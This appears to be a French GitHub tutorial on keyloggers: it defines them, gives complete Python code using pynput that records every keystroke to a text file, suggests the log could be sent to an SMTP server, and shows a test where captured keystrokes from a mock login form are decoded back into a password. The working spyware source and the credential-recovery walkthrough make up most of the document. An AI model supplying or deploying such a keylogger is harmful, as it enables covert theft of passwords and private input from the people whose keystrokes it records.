<h2 align="center">Qu'est ce qu'un Keylogger ?</h2>

<p>
un Keylogger est un logiciel permettant d'enregistrer les frappes faites au clavier. 
Ce malware rentre dans la catégorie des spywares. 
</p>

<h2 align="center">A quoi sert t-il ?</h2>

<p>
Ce spyware permet de connaitre les touches frappées par l'utilisateur. 
En renconstituant l'arborescence, on peut déterminer des mots de passes, des sites webs consultés ... 

</p>

<h4>Exemple :</h4>
<p>
facebookmonadressemail@mail.comPassw0rd1 

En décomposant cette liste, on peut déterminer que l'utilisateur c'est rendu sur Facebook,
à comme adresse mail : adressemail@mail.com et comme mot de passe : Passw0rd1.
</p>

<h3 align="center">Création d'un Keylogger</h3>

<p> 
Nous allons avoir besoin de plusieurs choses.
</p>

<ul>
    <li>Un éditeur de texte.</li>
    <li>Pyton3 d'installé sur notre machine.</li>
    <li>La librairie pynput installée</li>
</ul>

<p>
Pour installer la librairie pynput :
</p>

```python  

pip install pynput

```

<p>
Voici le code que j'ai réaliser permettant d'enregistrer chaque frappe dans un fichier .txt. 
Il est possible de modifier ce code pour envoyer les informations vers un serveur SMTP ou autre.

Mon objectif est juste d'analyser le comportement d'un keylogger 
</p>

<h3 align="center">Le code Python</h3>

```python
from pynput.keyboard import Listener #Import de la librairie
import logging

file="DataKey.txt" #fichier dans lequel va être enregistrer les frappes
logging.basicConfig(filename=file, level=logging.DEBUG, format="%(message)s") #les informations que l'on souhaite récupérer lors de la frappe.

def on_press(key): #fonction qui récupère les touches frapper par l'utilisateur. 
    logging.info(key)

with Listener(on_press=on_press) as listener:
    listener.join()

```

<h3 align="center">Test grandeur nature</h3>


<p>
Pour la seconde partie, je n'ai pas converti le programme en .exe ou essayer de l'obfusquer.
J'ai créé la maquette d'un site web contenant un form. 

J'ai demandé à plusieurs personnes de rentrer un mot de passe. 
</p>

![Formulaire](https://user-images.githubusercontent.com/96829109/188643428-eded0ff1-f9e4-4acb-8b92-4345f0b35001.PNG)

<p>
Pour valider le bon fonctionnement du site web, j'ai vérifier les données enregistrer par le keylogger. 
</p>

```
Key.shift
'P'
'a'
's'
's'
'w'
'o'
'r'
'd'
<97>
```

![Capture](https://user-images.githubusercontent.com/96829109/196785889-63e88f16-ab89-40ba-a295-06365daf1680.PNG)

<p>
On peut comprendre que une ou plusieurs lettres sont en majuscules car la touche Shift a été pressée.

De plus, à la fin nous avons un chiffre '97'. Cela ne correspond pas au password.

Pour cela, j'ai du effectuer un tableau pour obtenir une concordance.

<table>
    <tr>
      <td>0</td>
      <td>1</td>
      <td>2</td>
      <td>3</td>
      <td>4</td>
      <td>5</td>
      <td>6</td>
      <td>7</td>
      <td>8</td>
      <td>9</td>
    </tr>
    <tr>
      <td>96</td>
      <td>97</td>
      <td>98</td>
      <td>99</td>
      <td>100</td>
      <td>101</td>
      <td>102</td>
      <td>103</td>
      <td>104</td>
      <td>105</td>
    </tr>
</table>

<p>
Le mot de passe contient à 1 à la fin. Il ne reste plus qu'à tester quels sont les lettres en majuscules. 
</p>
